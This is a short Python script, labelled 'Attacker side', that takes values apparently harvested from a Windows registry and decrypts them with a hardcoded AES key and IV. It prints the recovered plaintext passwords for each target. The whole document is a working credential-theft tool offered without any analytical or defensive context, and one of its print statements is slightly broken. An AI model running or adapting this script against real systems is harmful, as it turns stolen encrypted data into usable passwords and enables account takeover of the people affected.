# Attacker side
from Crypto.Cipher import AES
import binascii, hexdump, sys
class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)
    
AESkey = binascii.unhexlify("0602000000A400005253413100040000")
AESiv  = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

with open("./output", "r") as f:
    for line in f.readlines():
        target, val = line.split()
        ciphertext = binascii.unhexlify(val)
        print("Fetching from Registry......")
        print("Found {target} : {val}")
        print("Unhexlify......")
        print("Decrypting with known key......")
        AESSolver = AESCipher(AESkey)
        result = AESSolver.decrypt(AESiv, ciphertext)
        print(hexdump.hexdump(result))
        password = result.decode('utf-16')
        print(f"Raw value of {target} : {password}\n\n")